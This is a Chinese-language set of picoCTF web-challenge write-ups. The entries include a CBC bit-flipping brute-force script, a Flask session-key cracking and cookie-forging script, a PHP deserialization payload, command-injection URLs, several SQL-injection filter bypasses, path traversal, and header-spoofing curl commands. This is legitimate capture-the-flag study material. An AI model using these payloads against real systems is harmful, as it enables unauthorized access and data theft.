
## GET aHEAD

Description：Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:28916/

思路：Linux 下使用命令 `curl -I HEAD -i http://mercury.picoctf.net:28916/index.php`


## Cookies

Description：Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:64944/

思路：使用 chrome 浏览器修改 cookie 的值，每次将 value 的数值增加 1，直到 18，直到给出标志


## Insp3ct0r

Description：Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/9670/ (link) or http://jupiter.challenges.picoctf.org:9670

思路：查看 html、css 和 javascript 的源代码。标志在代码中。


## Scavenger Hunt

Description：There is some interesting information hidden around this site http://mercury.picoctf.net:55079/. Can you find it?

思路：

1. 单击链接之后查看页面的源代码，包含一部分标志。
2. 查看 `/mycss.css` 文件，包含一部分标志。
3. 查看 `myjs.js` 文件，包含一部分标志。
4. 查看 `robots.txt` 文件，包含一部分标志。
5. 查看 `.htaccess` 文件，包含一部分标志。
6. 查看 `.DS_Store` 文件，包含一部分标志。


## Some Assembly Required 1

Description：http://mercury.picoctf.net:40226/index.html

思路：JIFxzHyW8W 文件中包含标志。


## More Cookies

Description：I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:43275/

思路：

1. 先获取 cookie，有一个名为 cookieauth_name的值。使用Cyber​​Chef将其解码为 base64会产生乱码，因为它已根据挑战描述进行了加密。

2. 字母C、B和C在挑战描述中大写，暗示使用了密码块链接 (CBC) 。CBC 容易受到比特位翻转的影响。Crypto StackExchange 上的这个答案广泛解释了这种攻击。本质上，有一个位可以确定用户是否是管理员。也许有一个参数admin=0，如果我们改变正确的位，那么我们就可以设置admin=1。然而，这个位的位置是未知的，所以我们可以尝试每个位置，直到我们得到标志。

3. 我们编写一个改进的 Python script.py来完成这个暴力破解攻击。该脚本遍历 cookie 中的所有位并翻转每个位，直到显示标志。有关详细信息，请参阅脚本中的注释。

    ```
    import requests
    import base64
    from tqdm import tqdm
    
    ADDRESS = "http://mercury.picoctf.net:43275/"
    
    s = requests.Session()
    s.get(ADDRESS)
    cookie = s.cookies["auth_name"]
    print(cookie)
    # Decode the cookie from base64 twice to reverse the encoding scheme.
    decoded_cookie = base64.b64decode(cookie)
    raw_cookie = base64.b64decode(decoded_cookie)
    
    
    def exploit():
        # Loop over all the bytes in the cookie.
        for position_idx in tqdm(range(0, len(raw_cookie))):
            # Loop over all the bits in the current byte at `position_idx`.
            for bit_idx in range(0, 8):
                # Construct the current guess.
                # - All bytes before the current `position_idx` are left alone.
                # - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
                #   This is done by XORing the byte with another byte where all bits are zero
                #   except for the bit in position `bit_idx`. The code `1 << bit_idx`
                #   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
                #   the XOR operation will flip the bit in position `bit_idx`.
                # - All bytes after the current `position_idx` are left alone.
                bitflip_guess = (
                    raw_cookie[0:position_idx]
                    + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                    + raw_cookie[position_idx + 1 :]
                )
    
                # Double base64 encode the bit-blipped cookie following the encoding scheme.
                guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()
    
                # Send a request with the cookie to the application and scan for the
                # beginning of the flag.
                r = requests.get(ADDRESS, cookies={"auth_name": guess})
                if "picoCTF{" in r.text:
                    print(f"Admin bit found in byte {position_idx} bit {bit_idx}.")
                    # The flag is between `<code>` and `</code>`.
                    print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                    return
    
    exploit()
    ```


## where are the robots

Description：Can you find the robots? https://jupiter.challenges.picoctf.org/problem/56830/ (link) or http://jupiter.challenges.picoctf.org:56830

思路：

1. 先访问 robots：`https://2019shell1.picoctf.com/problem/56830/robots.txt`
    ```
    User-agent: *
    Disallow: /e0779.html
    ```

2. 然后访问这个地址：`https://2019shell1.picoctf.com/problem/56830/e0779.html`，在页面上找到了标志。


## logon

Description：The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/44573/ (link) or http://jupiter.challenges.picoctf.org:44573

思路：

1. 尝试使用空凭据登录。
2. 修改 cookie 中的 admin 的值为 True。


## dont-use-client-side

Description：Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/17682/ (link) or http://jupiter.challenges.picoctf.org:17682

思路：

1. 查看链接的源代码。
    ```
     if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '706c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_b') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '5}') {
                  alert("Password Verified")
                  }
                }
              }
            }
          }
        }
      }
    }
    ```
2. 按照代码的字符串进行拼接。


## It is my Birthday

Description：I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:48746/

思路：查找一些冲突的 PDF。我使用了md5-1.pdf和md5-1.pdf。将这些 PDF 上传到服务器并获取 PHP 代码和标志。


## Who are you?

Description：Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:34588/

思路：在 Linux 下运行命令：

```
curl http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->Only people who use the official PicoBrowser are allowed on this site!

curl --user-agent "picobrowser" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->I don&#39;t trust users visiting from another site.

curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->Sorry, this site only worked in 2018.

curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" -H "Date: Mon, 23 11 2018 23:23:23 GMT" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->I don&#39;t trust users who can be tracked.

curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->This website is only for people from Sweden.

curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->You&#39;re in Sweden but you don&#39;t speak Swedish?

curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:34588/ | grep "<h3.*>.*<\/h3>"-->What can I say except, you are welcome

# 最终命令
curl --user-agent "picobrowser" --referer "http://mercury.picoctf.net:34588/" -H "Date: Mon, 23 11 2018 23:23:23 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.71.255.255" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:34588/ | grep "<b>.*</b>"-->picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}
```


## login

Description：My dog-sitter's brother made this website but I can't get in; can you help? login.mars.picoctf.net

思路：开发人员工具-网络中找到index.js，里面有密码Base64编码后的密文，解密即为flag。


## Includes

Description：Can you get the flag?Go to this website and see what you can discover.

思路：我们可以看到导入了两个文件，style.css和script.js。如果我们打开这些文件，我们可以看到每个文件都包含一半的标志。


## Inspect HTML

Description：Can you get the flag?Go to this website and see what you can discover.

思路：查看网页源代码，可以直接获取 flag


## Local Authority

Description：Can you get the flag?Go to this website and see what you can discover.

思路：提示建议我们绕过登录。我们用 a,a 登录，这个时候会显示 `登录失败`，查看 `secure.js` 文件发现 `username === 'admin' && password === 'strongPassword098765'`, 然后直接用 `admin` 和 `strongPassword098765` 登录。


## Search source

Description：The developer of this website mistakenly left an important artifact in the website source, can you find it?

思路：通过`另存为`下载源代码，然后使用搜索工具搜索 `picoCTF`。


## Some Assembly Required 2

Description：http://mercury.picoctf.net:44570/index.html

思路：下载http://mercury.picoctf.net:15406/aD8SvhyVkb。我们会看到上次标志所在的位置似乎是一些编码文本：`+xakgK\Ns><m:i1>1991:nkjl<ii1j0n=mm09;<i:u`

在尝试了一些不同的编码方法后，我遇到了 XOR 并看到这个字符串只是标志与字节 0x08 的异或，访问`https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,'')&input=K3hha2dLXE5zPjxtOmkxPjE5OTE6bmtqbDxpaTFqMG49bW0wOTs8aTp1` 进行解码。


## Super Serial

Description：Try to recover the flag stored on this website http://mercury.picoctf.net:25395/

思路：

挑战为我们提供了一个打开网页的链接，允许我们使用用户名和密码登录。做一些标准的 recoinassaince 我们发现这个 robots.txt 文件：

```
用户代理： *
不允许：/admin.phps
```

`.phps`文件是 php 源文件，鉴于它们可能存在于本网站，我们尝试在 http://mercury.picoctf.net:8404/index.phps 找到 index.php 文件的来源：

除了`cookie.php`和`authentication.php`文件之外，这里没有什么有趣的地方，我们可以在 http://mercury.picoctf.net:8404/cookie.phps 找到源代码：

在 http://mercury.picoctf.net:8404/authentication.phps：

这里的漏洞在于access_log类

因为我们可以创建一个将读取“../flag”的 access_log 对象，将其传递给反序列化器

然后使用base64对其进行编码并将其传递到登录cookie中以触发反序列化错误

并把旗帜递给我们。为此，请在 base64 中对字符串“O:10:”access_log”:1:{s:8:”log_file”;s:7:”../flag”;}”进行编码，并将其传递到登录 cookie 中卷曲。

尾注：找到需要编码的字符串 "O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}" 我在网上玩过sandbox.onlinephpfunctions.com 上的 php 编译器，具有序列化和反序列化功能。


## Most Cookies

Description：Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:6259/

思路：

1. 查看 [服务器脚本](./server.py) 我们可以看到应用程序的密钥被设置为一个随机的 cookie 名称：

    ```
    cookie_names = '["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]'
    app.secret_key = random.choice(cookie_names)
    ```

2. 应用程序的密钥用于签署一个cookie，这样它就不能被修改。然而，由于我们知道密钥是 28 个 cookie 名称之一，我们可以简单地尝试所有名称，直到我们成功解密 cookie。

3. 因此，第一步是访问网站并复制会话 cookie：`eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YFNV9A.fnwblKJPgNM2A8VNOblzALp9bTI`

4. 我们可以编写一个脚本，它使用 Flask 的[ `SecureCookieSessionInterface` ](https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions. py#L304) 解码和编码 cookie。
    ```
    # -*- coding:utf-8 -*-
    """
        @Time  : 2022/12/12  10:00
        @Author: Feng Lepeng
        @File  : t4.py
        @Desc  :
    """
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from itsdangerous.exc import BadTimeSignature
    from flask.sessions import TaggedJSONSerializer
    def flask_cookie(secret_key, cookie_str, operation):
        # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
        salt = 'cookie-session'
        serializer = TaggedJSONSerializer()
        signer_kwargs = {
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
        s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
        if operation == "decode":
            return s.loads(cookie_str)
        else:
            return s.dumps(cookie_str)
    
    # The list of possible secret keys used by the app.
    possible_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
    
    # An encoded cookie pulled from the live application that can be used to guess the secret key.
    cookie_str = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y5aLfQ.8-yo5AQkbRkdClPgrdEkj4-houU"
    
    # For each possible key try to decode the cookie.
    for possible_secret_key in possible_keys:
        try:
            cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
        except BadTimeSignature:
            # If the decoding fails then try the next key.
            continue
        secret_key = possible_secret_key
        # Break the loop when we have the corret key.
        break
    
    print("Secret Key: %s" % secret_key)
    
    # The admin cookie has the `very_auth` value set to `admin`, which can be seen on line 46 of the server.py code.
    admin_cookie = {"very_auth": "admin"}
    # Encode the cookie used the `SecureCookieSessionInterface` logic.
    admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")
    
    print("Admin Cookie: %s" % admin_cookie_encoded)
    
    
    if __name__ == '__main__':
        pass
    ```

5. 但首先我们需要确定我们应该在 cookie 中设置什么值。我们可以在 [服务器代码](./sever.py) 的第 45-47 行找到它。

   ```
    check = session["very_auth"]
    if check == "admin":
        resp = make_response(render_template("flag.html", value=flag_value, title=title))
    ```

    所以，我们需要在cookie中存储`{"very_auth": "admin"}` 。

6. 运行 solve [ script ](./script.py) 将尝试每个秘密密钥，然后一旦通过解码已知 cookie 成功找到密钥，它将对上述 cookie 数据进行编码。

7. 我们可以用我们的admin cookie替换网站上的cookie，刷新页面，就会显示flag。


## caas

Description：Now presenting cowsay as a service

思路：这是一个命令注入漏洞，依次在url 输入

1. `https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D;ls`
2. `https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D;cat%20falg.txt`


## Some Assembly Required 3

Description：http://mercury.picoctf.net:12557/index.html

思路：
1. 先 wasm 转 wat：`https://webassembly.github.io/wabt/demo/wasm2wat/index.html`
    ```
    (data $d0 (i32.const 1024) "\9dn\93\c8\b2\b9A\8b\c2\97\d4f\c7\93\c4\d4a\c2\c6\c9\ddb\94\9e\c2\892\91\90\c1\dd3\91\91\97\8bd\c1\92\c4\90\00\00")
    (data $d1 (i32.const 1067) "\f1\a7\f0\07\ed"))
    ```
2. 把字符串转化为对应的 16 进制
    ```
    arr_1067 = [
        0xf1, 0xa7, 0xf0, 0x07, 0xed,
    ]
    
    arr_1024 = [
        0x9d, 0x6e, 0x93, 0xc8, 0xb2, 0xb9, 0x41, 0x8b, 0xc2, 0x97, 0xd4, 0x66, 0xc7, 0x93, 0xc4, 0xd4, 0x61, 0xc2, 0xc6, 0xc9, 0xdd, 0x62,
        0x94, 0x9e, 0xc2, 0x89, 0x32, 0x91, 0x90, 0xc1, 0xdd, 0x33, 0x91, 0x91, 0x97, 0x8b, 0x64, 0xc1, 0x92, 0xc4, 0x90, 0x00, 0x00
    ]
    ```
3. 运行脚本
    ```
    # -*- coding:utf-8 -*-
    """
        @Time  : 2022/12/12  10:39
        @Author: Feng Lepeng
        @File  : t5.py
        @Desc  :
    """
    import ctypes
    import string
    
    arr_1067 = [
        0xf1, 0xa7, 0xf0, 0x07, 0xed,
    ]
    
    
    def encode(char, index):
        assert (len(arr_1067) == 5)
        var_j = 4 - (index % len(arr_1067))
        var_l = arr_1067[var_j]
        var_n = ctypes.c_int32(var_l << 24).value
        var_o = ctypes.c_int32(var_n >> 24).value
        var_q = ctypes.c_int32(ord(char) ^ var_o).value
        res = ctypes.c_uint8(var_q).value
        return res
    
    
    arr_1024 = [
        0x9d, 0x6e, 0x93, 0xc8, 0xb2, 0xb9, 0x41, 0x8b, 0xc2, 0x97, 0xd4, 0x66, 0xc7, 0x93, 0xc4, 0xd4, 0x61, 0xc2, 0xc6, 0xc9, 0xdd, 0x62,
        0x94, 0x9e, 0xc2, 0x89, 0x32, 0x91, 0x90, 0xc1, 0xdd, 0x33, 0x91, 0x91, 0x97, 0x8b, 0x64, 0xc1, 0x92, 0xc4, 0x90, 0x00, 0x00
    ]
    
    for i in range(len(arr_1024)):
        for c in string.printable:
            if encode(c, i) == arr_1024[i]:
                print(c, end="")
    
    print("")
    
    if __name__ == '__main__':
        pass

    ```


## Web Gauntlet 2

Description：This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:57359/ Filter: http://mercury.picoctf.net:57359/filter.php

思路：这是一个 SQL 注入

1. `curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:35178/index.php --cookie "PHPSESSID=5ntoldq0gkiutgqkmkgfqbe5vb" --output -`
2. `curl http://mercury.picoctf.net:35178/filter.php --cookie "PHPSESSID=5ntoldq0gkiutgqkmkgfqbe5vb" | grep picoCTF`


## picobrowser

Description：This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/28921/ (link) or http://jupiter.challenges.picoctf.org:28921

思路：`curl --user-agent "picobrowser" "https://jupiter.challenges.picoctf.org/problem/28921/flag"`


## Client-side-again

Description：Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/60786/ (link) or http://jupiter.challenges.picoctf.org:60786

思路：

1. 调用 `http://www.jsnice.org/` 使 Javascript 代码更具可读性。
2. _0x4b5b是一个用来混淆不同值的函数。它是在运行时计算的。我们可以使用浏览器的 Javascript 控制台（“开发者工具”）来评估_0x4b5b和读取它的值
3. 用硬编码值替换函数调用以提高可读性。
4. 然后对 flag 进行拼接。


## Web Gauntlet

Description：Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:41560/ http://jupiter.challenges.picoctf.org:41560/filter.php

思路：SQL 注入绕过

1. 要通过第一轮，我们可以使用`admin'--`作为用户名，使该子句的其余部分被解释为注释：
    ```sql
    SELECT  *  FROM users WHERE username = ' admin ' -- ' AND password='pass'
    ```

2. 第 2 轮介绍了以下过滤器：
    ```
    Round2: or and like = --
    ```
    我们将尝试不同的评论风格。`#`不起作用，但`/*`起作用，使我们的输入`admin'/*`和我们的完整子句：
    ```sql
    SELECT  *  FROM users WHERE username = ' admin ' /* ' AND password='pass'
    ```
3. 第 3 轮有以下过滤器：
    ```
    Round3：or and = like > < --
    ```
    同样的技巧在这里起作用，使用 `admin'/*`：
    ```sql
    SELECT * FROM users WHERE username='admin'/*' AND password='pass'
    ```
4. 第 4 轮过滤器：
    ```
    第四轮：or and = like > < -- admin
    ```
    我们不能使用 `admin`，所以我们只能通过连接重新创建字符串。`CONCAT` 似乎不起作用，但 `||` 起作用，这一定是 sqlite。
    我们输入 `a'||'dmin'/*` 作为输入并得到：
    ```sql
    SELECT * FROM users WHERE username='a'||'dmin'/*' AND password='pass'
    ```
5. 最后一轮，过滤器是：
    ```
    Round5: or and = like > < -- union admin
    ```
    和以前一样，我们使用 `a'||'dmin'/*` 得到：
    ```sql
    SELECT * FROM users WHERE username='a'||'dmin'/*' AND password='pass'
    ```
6. 最后，查看 `filter.php` 的标志。


## Forbidden Paths
 
Description：Can you get the flag?Here's the website.We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

思路：这个网站有一个有用的功能，可以读取我们想要的任何文件，给定它的路径。对于文件路径，前导./表示当前目录，前导../表示封闭目录。因为我们知道我们在/usr/share/nginx/html/，并且想要访问/flag.txt，我们可以只使用路径`../../../../flag.txt`来读取标志。


## Power Cookie

Description：Can you get the flag?Go to this website and see what you can discover.

思路：修改 cookie 中 `isAdmin` 的值为1。


## Roboto Sans

Description：The flag is somewhere on this web application not necessarily on the website. Find it.Check this out.

思路：

1. 查看 "robots.text" 文件
    ```
    User-agent *
    Disallow: /cgi-bin/
    Think you have seen your flag or want to keep looking.
    
    ZmxhZzEudHh0;anMvbXlmaW
    anMvbXlmaWxlLnR4dA==
    svssshjweuiwl;oiho.bsvdaslejg
    Disallow: /wp-admin/
    ```

2. 对 `anMvbXlmaWxlLnR4dA==` 使用 base64 解码，得到`js/myfile.txt`


## Secrets

Description：We have several pages hidden. Can you find the one with the flag?The website is running here.

思路：
1. 我们右键单击 --> 检查并查看源选项卡，我们会发现一些资产位于名为“secret”的可疑文件夹中。
2. 访问 `http://saturn.picoctf.net:61481/secret`，我们会找到一个网站，上面写着“终于。你几乎找到我了。你做得很好”。重复之前的过程，我们会发现还有一个名字可疑的文件夹，“hidden”。
3. 导航到`http://saturn.picoctf.net:61481/secret/hidden/`，然后导航到 `http://saturn.picoctf.net:61481/secret/hidden/superhidden/`。我们不断重复这个过程，直到我们到达一个网站，上面写着“终于。你找到了我。但是你能看到我吗”。
4. 该标志可能被 css 隐藏了。我们可以查看源 HTML 来获取标志。


## SQL Direct

Description：Connect to this PostgreSQL server and find the flag!

思路：

1. 连接到 PostgreSQL；
2. `\l` 查看库
3. `\c pico` 连接到库
4. `select * from flags` 查看 flag。


## notepad

Description：This note-taking site seems a bit off。


## Irish-Name-Repo 1

Description：There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ (link) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

思路：一个 SQL 注入，名字写 `a' or 1=1 --`


## Web Gauntlet 3

Description：Last time, I promise! Only 25 characters this time. Log in as admin Site: http://mercury.picoctf.net:24143/ Filter: http://mercury.picoctf.net:24143/filter.php

思路：SQL 注入漏洞，最终的 Username: `adm' || trim('in'`, Password:`) || '`